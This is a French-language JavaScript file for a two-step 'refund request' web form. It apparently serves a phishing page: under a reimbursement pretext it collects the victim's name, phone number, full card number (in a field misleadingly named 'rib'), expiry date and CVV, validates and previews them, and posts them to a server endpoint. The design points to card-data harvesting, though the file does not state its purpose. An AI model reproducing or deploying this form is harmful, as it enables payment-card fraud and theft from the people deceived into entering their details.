const step1 = document.getElementById('step-1');
const step2 = document.getElementById('step-2');
const indicator1 = document.getElementById('indicator-1');
const indicator2 = document.getElementById('indicator-2');
const form = document.getElementById('remboursement-form');
const btnContinue = document.getElementById('btn-continue');
const btnBack = document.getElementById('btn-back');
const btnSubmit = document.getElementById('btn-submit');
const successMessage = document.getElementById('success-message');
const alertError = document.getElementById('alert-error');

const cardNumberDisplay = document.getElementById('card-number-display');
const cardHolderDisplay = document.getElementById('card-holder-display');
const cardExpiryDisplay = document.getElementById('card-expiry-display');
const cardTypeIcon = document.getElementById('card-type-icon');

function showError(fieldId, message) {
  const input = document.getElementById(fieldId);
  const errorEl = document.getElementById(`error-${fieldId}`);
  input.classList.add('invalid');
  errorEl.textContent = message;
}

function clearError(fieldId) {
  const input = document.getElementById(fieldId);
  const errorEl = document.getElementById(`error-${fieldId}`);
  input.classList.remove('invalid');
  errorEl.textContent = '';
}

function validateStep1() {
  let valid = true;
  const nom = document.getElementById('nom').value.trim();
  const telephone = document.getElementById('telephone').value.trim();

  clearError('nom');
  clearError('telephone');

  if (!nom) {
    showError('nom', 'Veuillez entrer votre nom.');
    valid = false;
  }

  if (!telephone || telephone.length < 8) {
    showError('telephone', 'Veuillez entrer un numero valide.');
    valid = false;
  }

  return valid;
}

function validateStep2() {
  let valid = true;
  const rib = document.getElementById('rib').value.trim();
  const nomCompte = document.getElementById('nomCompte').value.trim();
  const date = document.getElementById('date').value.trim();
  const CVV = document.getElementById('CVV').value.trim();

  ['rib', 'nomCompte', 'date', 'CVV'].forEach(clearError);

  const cardNumber = rib.replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    showError('rib', 'Le numero de carte doit contenir 16 chiffres.');
    valid = false;
  }

  if (!nomCompte) {
    showError('nomCompte', 'Veuillez entrer le nom du titulaire.');
    valid = false;
  }

  if (!/^\d{2}\/\d{2}$/.test(date)) {
    showError('date', 'Format requis : MM/AA');
    valid = false;
  }

  if (!/^\d{3,4}$/.test(CVV)) {
    showError('CVV', 'CVV invalide (3 ou 4 chiffres).');
    valid = false;
  }

  return valid;
}

function goToStep2() {
  step1.classList.remove('active');
  step2.classList.add('active');
  indicator1.classList.remove('active');
  indicator1.classList.add('done');
  indicator2.classList.add('active');

  const nom = document.getElementById('nom').value.trim();
  document.getElementById('nomCompte').value = nom;
  cardHolderDisplay.textContent = nom.toUpperCase() || 'VOTRE NOM';
}

function goToStep1() {
  step2.classList.remove('active');
  step1.classList.add('active');
  indicator2.classList.remove('active');
  indicator1.classList.remove('done');
  indicator1.classList.add('active');
}

function formatCardNumber(value) {
  const digits = value.replace(/\D/g, '').substring(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
}

function getCardType(number) {
  const digits = number.replace(/\D/g, '');
  if (/^4/.test(digits)) return 'visa';
  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'mastercard';
  if (/^3[47]/.test(digits)) return 'amex';
  if (/^6(?:011|5)/.test(digits)) return 'discover';
  return '';
}

function updateCardTypeIcon(type) {
  const icons = {
    visa: 'VISA',
    mastercard: 'MC',
    amex: 'AMEX',
    discover: 'DISC',
  };
  cardTypeIcon.textContent = icons[type] || '';
  cardTypeIcon.style.fontSize = '0.7rem';
  cardTypeIcon.style.fontWeight = '700';
  cardTypeIcon.style.color = '#667eea';
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, '').substring(0, 4);
  if (digits.length >= 2) {
    return digits.substring(0, 2) + '/' + digits.substring(2);
  }
  return digits;
}

// Card number input
document.getElementById('rib').addEventListener('input', function (e) {
  const raw = e.target.value.replace(/\D/g, '');
  e.target.value = formatCardNumber(raw);

  const display = formatCardNumber(raw).padEnd(19, '•').replace(/ /g, ' ');
  cardNumberDisplay.textContent = display || '•••• •••• •••• ••••';

  const type = getCardType(raw);
  updateCardTypeIcon(type);

  if (raw.length > 0) clearError('rib');
});

// Card holder input
document.getElementById('nomCompte').addEventListener('input', function (e) {
  cardHolderDisplay.textContent = e.target.value.toUpperCase() || 'VOTRE NOM';
  if (e.target.value.trim()) clearError('nomCompte');
});

// Expiry input
document.getElementById('date').addEventListener('input', function (e) {
  e.target.value = formatExpiry(e.target.value);
  cardExpiryDisplay.textContent = e.target.value || 'MM/AA';
  if (e.target.value.trim()) clearError('date');
});

// CVV input
document.getElementById('CVV').addEventListener('input', function (e) {
  e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
  if (e.target.value) clearError('CVV');
});

// Clear errors on input
document.getElementById('nom').addEventListener('input', () => clearError('nom'));
document.getElementById('telephone').addEventListener('input', () => clearError('telephone'));

btnContinue.addEventListener('click', () => {
  if (validateStep1()) goToStep2();
});

btnBack.addEventListener('click', goToStep1);

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  alertError.classList.add('hidden');

  if (!validateStep2()) return;

  btnSubmit.disabled = true;
  btnSubmit.textContent = 'Envoi en cours...';

  const data = {
    nom: document.getElementById('nom').value.trim(),
    telephone: document.getElementById('telephone').value.trim(),
    rib: document.getElementById('rib').value.trim().replace(/\s/g, ''),
    nomCompte: document.getElementById('nomCompte').value.trim(),
    date: document.getElementById('date').value.trim(),
    CVV: document.getElementById('CVV').value.trim(),
  };

  try {
    const res = await fetch('/api/remboursement', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });

    const result = await res.json();

    if (!res.ok) throw new Error(result.error || 'Erreur inconnue');

    form.classList.add('hidden');
    document.querySelector('.steps').classList.add('hidden');
    successMessage.classList.remove('hidden');
  } catch (err) {
    alertError.textContent = err.message;
    alertError.classList.remove('hidden');
    alertError.classList.add('error');
    btnSubmit.disabled = false;
    btnSubmit.textContent = 'Envoyer la demande';
  }
});
